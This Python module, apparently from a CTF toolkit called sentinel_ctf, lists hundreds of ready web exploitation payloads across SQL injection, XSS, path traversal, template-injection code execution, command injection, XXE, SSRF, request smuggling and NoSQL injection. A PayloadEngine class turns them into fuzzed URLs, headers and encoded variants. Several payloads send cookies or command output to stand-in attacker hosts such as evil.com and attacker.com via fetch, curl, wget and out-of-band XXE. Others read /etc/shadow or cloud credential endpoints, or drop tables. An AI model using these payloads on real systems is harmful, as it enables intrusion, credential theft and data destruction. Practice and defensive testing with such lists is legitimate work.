"""
sentinel_ctf.payloads.web.payloads  (EXPANDED)
================================================
300+ web exploitation payloads across all categories.
"""
from __future__ import annotations

import re
import urllib.parse

# ---------------------------------------------------------------------------
# SQL Injection — 50 payloads
# ---------------------------------------------------------------------------
SQL_INJECTION: list[str] = [
    # Basic
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    "1' OR '1'='1",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password,3 FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 UNION SELECT @@version,NULL--",
    # Boolean blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SUBSTRING(username,1,1)='a'--",
    "' AND ASCII(SUBSTRING(password,1,1))>64--",
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "1; SELECT SLEEP(5)--",
    "' AND SLEEP(5)--",
    "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1 OR SLEEP(5)",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))--",
    # Stacked queries
    "'; INSERT INTO users VALUES('hacker','hacked')--",
    "'; DROP TABLE users--",
    "1; UPDATE users SET password='hacked' WHERE '1'='1",
    # WAF bypass
    "' /*!50000OR*/ '1'='1",
    "' OR/**/'1'='1",
    "'/**/OR/**/1=1--",
    "%27%20OR%20%271%27%3D%271",
    "' oR '1'='1",
    "'%09OR%091=1--",
    "' OR 0x313d31--",
    "' OR char(49)=char(49)--",
    # PostgreSQL specific
    "'; SELECT pg_sleep(5)--",
    "' UNION SELECT null,current_database()--",
    "' UNION SELECT null,string_agg(table_name,',') FROM information_schema.tables--",
    # SQLite specific
    "' UNION SELECT null,group_concat(tbl_name) FROM sqlite_master--",
    "' UNION SELECT null,sql FROM sqlite_master--",
    # MSSQL specific
    "'; EXEC xp_cmdshell('id')--",
    "'; EXEC master..xp_cmdshell('whoami')--",
]

# ---------------------------------------------------------------------------
# XSS — 40 payloads
# ---------------------------------------------------------------------------
XSS_PAYLOADS: list[str] = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
    # Img onerror
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=1 href=1 onerror='javascript:alert(1)'>",
    # SVG
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    # Iframe
    "<iframe src='javascript:alert(1)'>",
    "<iframe onload=alert(1)>",
    # Event handlers
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    # javascript: protocol
    "<a href=javascript:alert(1)>click</a>",
    "<a href='javascript:alert(document.cookie)'>X</a>",
    # data: URI
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    # Bypass: encoding
    "<script>\\u0061lert(1)</script>",
    "<img src=x onerror='&#97;&#108;&#101;&#114;&#116;(1)'>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    # Bypass: case mixing
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</sCrIpT>",
    # Bypass: tag tricks
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)</script>",
    # Polyglot
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
    # DOM-based
    "<img src=x onerror='document.write(\"<script>alert(1)<\\/script>\")'>" ,
    "'-alert(1)-'",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",
    # Template injection confused for XSS
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    # Prototype pollution
    "__proto__[test]=alert(1)",
    "constructor.prototype.test=alert(1)",
    # CSP bypass via JSONP
    "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)'></script>",
]

# ---------------------------------------------------------------------------
# LFI / Path Traversal — 30 payloads
# ---------------------------------------------------------------------------
LFI_PAYLOADS: list[str] = [
    # Basic
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # Null byte (PHP < 5.3)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    "../../../etc/passwd%00.jpg",
    # Double encoding
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://input",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "zip://shell.jpg%23shell.php",
    "phar://path/to/phar.phar/file.php",
    # Windows paths
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\windows\\win.ini",
    # Interesting Linux files
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
]

# ---------------------------------------------------------------------------
# SSTI — 25 payloads
# ---------------------------------------------------------------------------
SSTI_PAYLOADS: list[str] = [
    # Detection
    "{{7*7}}",
    "#{7*7}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${7*'7'}",
    "@(7*7)",
    # Jinja2 info
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # Jinja2 RCE
    "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{% import 'os' as os %}{{os.popen('id').read()}}",
    # Twig
    "{{7*7}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('system')}}",
    # Freemarker
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    # Smarty
    "{php}echo `id`;{/php}",
    "{system('id')}",
    # Pebble
    "{% for x in (1..1) %}{{x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}{% endfor %}",
    # Velocity
    "#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
]

# ---------------------------------------------------------------------------
# Command Injection — 30 payloads
# ---------------------------------------------------------------------------
COMMAND_INJECTION: list[str] = [
    # Basic
    "; id",
    "| id",
    "|| id",
    "&& id",
    "`id`",
    "$(id)",
    # Encoded
    ";%20id",
    "%7Cid",
    "%26%26%20id",
    # Newline
    "\nid",
    "\r\nid",
    "%0aid",
    "%0d%0aid",
    # Blind (time-based)
    "; sleep 5",
    "| sleep 5",
    "& ping -c 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",  # Windows
    "; sleep${IFS}5",
    "$(sleep 5)",
    # OOB (DNS)
    "; nslookup attacker.com",
    "| curl http://attacker.com/$(id)",
    "; wget http://attacker.com/?x=$(id)",
    # Shell metacharacters
    "a;id",
    "a`id`",
    "a$(id)",
    # Windows specific
    "& whoami",
    "| whoami",
    "|| whoami",
    "&& dir",
    "; dir",
    # Filter bypass
    "i''d",
    "i'd",
    "/b?n/id",
    "c'a't /etc/passwd",
    "${IFS}cat${IFS}/etc/passwd",
]

# ---------------------------------------------------------------------------
# XXE — 15 payloads
# ---------------------------------------------------------------------------
XXES: list[str] = [
    # Basic file read
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    # SSRF
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/api">]><foo>&xxe;</foo>',
    # Blind OOB
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;%all;]><data>&send;</data>',
    # Error-based
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo attr="&xxe;">',
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#37; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>',
    # Billion laughs DoS
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;">]><lolz>&lol5;</lolz>',
    # jar: protocol
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">]><foo>&xxe;</foo>',
    # SVG XXE
    '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
    # PHP expect wrapper
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    # Netdoc protocol
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>',
    # FTP OOB
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \'ftp://attacker.com:2121/%data;\'>">%param1;]><foo>&exfil;</foo>',
    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
]

# ---------------------------------------------------------------------------
# Open Redirect — 15 payloads
# ---------------------------------------------------------------------------
OPEN_REDIRECT: list[str] = [
    "//evil.com",
    "//evil.com/",
    "///evil.com",
    "////evil.com",
    "https://evil.com",
    "http://evil.com",
    "//evil.com%2F%2F",
    "//evil.com%09",
    "//evil.com%00",
    "/\\evil.com",
    "//evil%E3%80%82com",
    "//evil.com\\.google.com",
    "@evil.com",
    "javascript://evil.com%0aalert(1)",
    "data:text/html,<script>window.location='http://evil.com'</script>",
]

# ---------------------------------------------------------------------------
# JWT none alg example
# ---------------------------------------------------------------------------
JWT_NONE_ALG: str = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  # {"alg":"none","typ":"JWT"}
    ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9"  # {"sub":"admin","role":"admin"}
    "."  # empty signature
)

# ---------------------------------------------------------------------------
# CSRF bypass patterns
# ---------------------------------------------------------------------------
CSRF_BYPASS_TECHNIQUES: list[str] = [
    "Remove CSRF token from request entirely",
    "Use empty CSRF token value",
    "Use a known-valid token from a different session",
    "Change POST to GET method",
    "Change Content-Type to text/plain or application/x-www-form-urlencoded",
    "Use a wrong CSRF token (same length, different value)",
    "Double-submit cookie bypass (if validation is cookie-based)",
    "Referrer header bypass (remove or spoof Referer)",
    "Origin header bypass (try with null origin)",
    "CSRF via clickjacking (iframe embedding)",
    "SameSite cookie bypass via cross-site redirect",
    "CSRF via CORS misconfiguration",
]

# ---------------------------------------------------------------------------
# HTTP Request Smuggling
# ---------------------------------------------------------------------------
HTTP_SMUGGLING: list[str] = [
    # CL.TE
    "POST / HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
    # TE.CL
    "POST / HTTP/1.1\r\nHost: victim.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
    # TE.TE obfuscation
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding:\tchunked",
    "GET / HTTP/1.1\r\n Transfer-Encoding: chunked",
]

# ---------------------------------------------------------------------------
# GraphQL
# ---------------------------------------------------------------------------
GRAPHQL_PAYLOADS: list[str] = [
    # Introspection
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__schema{queryType{fields{name}}}}"}',
    '{"query":"{__type(name:\\"User\\"){fields{name type{name}}}}"}',
    # Batch attack
    '[{"query":"query{user(id:1){password}}"},{"query":"query{user(id:2){password}}"}]',
    # Injection via variable
    '{"query":"query($id:Int!){user(id:$id){admin}}","variables":{"id":0}}',
    # DoS via nested query
    '{"query":"{user{friends{friends{friends{friends{id}}}}}}"}',
    # Field suggest (typo to expose schema)
    '{"query":"{__typ(name:\\"Query\\"){name}}"}',
]

# ---------------------------------------------------------------------------
# NoSQL Injection
# ---------------------------------------------------------------------------
NOSQL_INJECTION: list[str] = [
    # MongoDB operator injection
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
    '{"$where": "1==1"}',
    '{"$where": "function(){return true}"}',
    # URL parameter injection
    "username[$gt]=&password[$gt]=",
    "username[$ne]=invalid&password[$ne]=invalid",
    "username=admin&password[$regex]=.*",
    # JSON injection in body
    '{"username":"admin","password":{"$ne":"x"}}',
    '{"username":{"$in":["admin","root"]},"password":{"$ne":""}}',
    # Array injection
    'username[]=admin&username[]=root&password[$ne]=',
]

# ---------------------------------------------------------------------------
# SSRF payloads
# ---------------------------------------------------------------------------
SSRF_PAYLOADS: list[str] = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",         # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",     # Alibaba Cloud
    "http://169.254.169.254/openstack/latest/",     # OpenStack
    # Internal services
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0/",
    # Bypass filters
    "http://2130706433/",          # 127.0.0.1 as decimal
    "http://0x7f000001/",          # 127.0.0.1 as hex
    "http://127.0.1/",
    "http://127.1/",
    "http://127.000.000.001/",
    "http://localhost.attacker.com/",
    "http://attacker.com@127.0.0.1/",
    "http://127.0.0.1.attacker.com/",  # DNS rebinding
    # Protocol confusion
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",  # Redis via gopher
    "dict://127.0.0.1:6379/info",
    "file:///etc/passwd",
    "ftp://127.0.0.1:21/",
]


# ---------------------------------------------------------------------------
# PayloadEngine  (central dispatcher)
# ---------------------------------------------------------------------------
_CATEGORY_MAP: dict[str, list] = {
    "sqli":           SQL_INJECTION,
    "sql_injection":  SQL_INJECTION,
    "xss":            XSS_PAYLOADS,
    "lfi":            LFI_PAYLOADS,
    "ssti":           SSTI_PAYLOADS,
    "cmdi":           COMMAND_INJECTION,
    "command_injection": COMMAND_INJECTION,
    "xxe":            XXES,
    "open_redirect":  OPEN_REDIRECT,
    "csrf":           CSRF_BYPASS_TECHNIQUES,
    "smuggling":      HTTP_SMUGGLING,
    "graphql":        GRAPHQL_PAYLOADS,
    "nosql":          NOSQL_INJECTION,
    "ssrf":           SSRF_PAYLOADS,
}


class PayloadEngine:
    """Central dispatcher for all web CTF payloads."""

    @staticmethod
    def get(category: str) -> list[str]:
        """Return payload list for a category name (case-insensitive)."""
        return _CATEGORY_MAP.get(category.lower(), [])

    @staticmethod
    def all_categories() -> list[str]:
        """Return sorted list of unique category names."""
        return sorted({k for k in _CATEGORY_MAP})

    @staticmethod
    def all_payloads() -> list[str]:
        """Return all payloads from all categories (flat)."""
        seen: set[str] = set()
        result = []
        for payloads in _CATEGORY_MAP.values():
            for p in payloads:
                if p not in seen:
                    seen.add(p)
                    result.append(p)
        return result

    @staticmethod
    def fuzz_url(base_url: str, param: str, payloads: list[str]) -> list[str]:
        """Return list of URLs with each payload substituted for param value."""
        results = []
        for payload in payloads:
            encoded = urllib.parse.quote(payload, safe="")
            if f"{param}=" in base_url:
                # Replace existing param value
                new_url = re.sub(
                    rf"({re.escape(param)}=)[^&]*",
                    rf"\g<1>{encoded}",
                    base_url,
                )
            else:
                sep = "&" if "?" in base_url else "?"
                new_url = f"{base_url}{sep}{param}={encoded}"
            results.append(new_url)
        return results

    @staticmethod
    def fuzz_header(header_name: str, payloads: list[str]) -> list[dict]:
        """Return list of header dicts to inject."""
        return [{header_name: p} for p in payloads]

    @staticmethod
    def mutate(payload: str) -> list[str]:
        """Return mutations of a payload: encoded variants."""
        variants = [payload]
        # URL encoded
        variants.append(urllib.parse.quote(payload, safe=""))
        # Double URL encoded
        variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
        # HTML entity encoded (basic)
        html_enc = "".join(f"&#{ord(c)};" for c in payload)
        variants.append(html_enc)
        # Case swap
        variants.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
        # SQL comment insertion
        variants.append(payload.replace(" ", "/**/"))
        return variants

    @staticmethod
    def for_param(param_name: str, category: str = "sqli") -> list[str]:
        """Return URL query strings for a parameter with all payloads of a category."""
        payloads = PayloadEngine.get(category)
        return [f"{param_name}={urllib.parse.quote(p)}" for p in payloads]

    @staticmethod
    def total_count() -> int:
        """Total unique payloads across all categories."""
        return len(PayloadEngine.all_payloads())
